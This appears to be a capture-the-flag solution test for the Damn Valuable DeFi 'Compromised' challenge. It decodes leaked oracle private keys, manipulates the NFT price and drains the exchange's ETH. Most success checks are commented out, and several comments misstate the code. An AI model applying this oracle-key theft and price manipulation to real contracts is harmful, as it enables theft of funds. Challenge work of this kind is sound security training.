const { expect } = require('chai');
const { ethers } = require('hardhat');

describe('Compromised challenge', function () {

    const sources = [
        '0xA73209FB1a42495120166736362A1DfA9F95A105',
        '0xe92401A4d3af5E446d93D11EEc806b1462b39D15',
        '0x81A5D6E50C214044bE44cA0CB057fe119097850c'
    ];

    let deployer, attacker;
    const EXCHANGE_INITIAL_ETH_BALANCE = ethers.utils.parseEther('9990');
    const INITIAL_NFT_PRICE = ethers.utils.parseEther('999');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const ExchangeFactory = await ethers.getContractFactory('Exchange', deployer);
        const DamnValuableNFTFactory = await ethers.getContractFactory('DamnValuableNFT', deployer);
        const TrustfulOracleFactory = await ethers.getContractFactory('TrustfulOracle', deployer);
        const TrustfulOracleInitializerFactory = await ethers.getContractFactory('TrustfulOracleInitializer', deployer);

        //send balance to the contract using provider, with method.
        // Initialize balance of the trusted source addresses
        for (let i = 0; i < sources.length; i++) {
            await ethers.provider.send("hardhat_setBalance", [
                sources[i],
                "0x1bc16d674ec80000", // 2 ETH
            ]);
            expect(
                await ethers.provider.getBalance(sources[i])
            ).to.equal(ethers.utils.parseEther('2'));
        }

        //send balance to the contract using provider, with method.
        // Attacker starts with 0.1 ETH in balance
        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x16345785d8a0000", // 0.1 ETH
        ]);

        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.equal(ethers.utils.parseEther('0.1'));

        // Deploy the oracle and setup the trusted sources with initial prices
        //all 3 NFT's will have the same 999ETH price for DVNFT token.
        //We need a Initializer for TrustfulOracle, because the construction takes limited inputs. But there are other arguments
        //that is needed for oracle to work. Hence we created a new contract which takes all the required arguments and setup the
        //TrustufulOracle.
        this.oracle = await TrustfulOracleFactory.attach(
            await (await TrustfulOracleInitializerFactory.deploy(
                sources,
                ["DVNFT", "DVNFT", "DVNFT"],
                [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE]
            )).oracle()
        );

        // Deploy the exchange and get the associated ERC721 token
        this.exchange = await ExchangeFactory.deploy(
            this.oracle.address,
            { value: EXCHANGE_INITIAL_ETH_BALANCE }
        );
        this.nftToken = await DamnValuableNFTFactory.attach(await this.exchange.token());
    });

    it('Exploit', async function () {
        // const privateKey1 = '0x4d48686a4e6a63345a575978595745304e545a6b59545931597a5a6d597a55344e6a466b4e4451344f544a6a5a475a68597a426a4e6d4d34597a49314e6a42695a6a426a4f575a69593252685a544a6d4e44637a4e574535';
        // const privateKey2 = '0x4d4867794d4467794e444a6a4e4442685932526d59546c6c5a4467344f5755324f44566a4d6a4d314e44646859324a6c5a446c695a575a6a4e6a417a4e7a466c4f5467334e575a69593251334d7a597a4e444269596a5134';

        //this is a base64 string
        //we need to first conver it to string, because the "string is actually the hex of private key"
        const privateKey1 = "4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35";
        const privateKey2 = "4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34";

        //convert string to bytes32
        const leakToPrivateKey = (str) => {
            const base64 = Buffer.from(str.split(` `).join(``), `hex`).toString(`utf8`);
            // console.log("Base: ", base64);
            const hexKey = Buffer.from(base64, `base64`).toString(`utf8`);
            // console.log(`Private key from base64 to string: ${hexKey}`);
            return hexKey;  //because the actual string is a hex value, hence "hexKey".
        };

        //create 2 signers from the private key.
        const signer2 = new ethers.Wallet(leakToPrivateKey(privateKey1), ethers.provider);

        const signer3 = new ethers.Wallet(leakToPrivateKey(privateKey2), ethers.provider);

        //check if the two private keys are correct.
        expect(signer2.address).to.be.eq(sources[1]);
        expect(signer3.address).to.be.eq(sources[2]);

        // console.log(signer2);

        //change the DVNFT price for both of the sources to 0.001
        const newPrice = ethers.utils.parseEther("0.01");
        await this.oracle.connect(signer2).postPrice("DVNFT", newPrice);
        await this.oracle.connect(signer3).postPrice("DVNFT", newPrice);

        //check price of the DVNFT
        expect(await this.oracle.getMedianPrice("DVNFT")).to.be.eq(newPrice);

        //store token IDs
        let arr = [];

        //buy 10 DVNFT
        await this.exchange.connect(attacker).buyOne({ value: newPrice });

        //change the prices of DVNFT back to the new price = 9989.99ETH.
        const balOfExchange = await ethers.provider.getBalance(this.exchange.address);
        await this.oracle.connect(signer2).postPrice("DVNFT", balOfExchange);
        await this.oracle.connect(signer3).postPrice("DVNFT", balOfExchange);

        //check price of the DVNFT
        expect(await this.oracle.getMedianPrice("DVNFT")).to.be.eq(balOfExchange);

        //sell the bought DVNFT tokens
        const tokenId = 0;  //this I got because I know that contract has not transacted any token yet.
        await this.nftToken.connect(attacker).approve(this.exchange.address, tokenId);
        await this.exchange.connect(attacker).sellOne(tokenId);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Exchange must have lost all ETH
        expect(
            await ethers.provider.getBalance(this.exchange.address)
        ).to.be.eq('0');

        // // Attacker's ETH balance must have significantly increased
        // expect(
        //     await ethers.provider.getBalance(attacker.address)
        // ).to.be.gt(EXCHANGE_INITIAL_ETH_BALANCE);

        // // Attacker must not own any NFT
        // expect(
        //     await this.nftToken.balanceOf(attacker.address)
        // ).to.be.eq('0');

        // // NFT price shouldn't have changed
        // expect(
        //     await this.oracle.getMedianPrice("DVNFT")
        // ).to.eq(INITIAL_NFT_PRICE);
    });
});
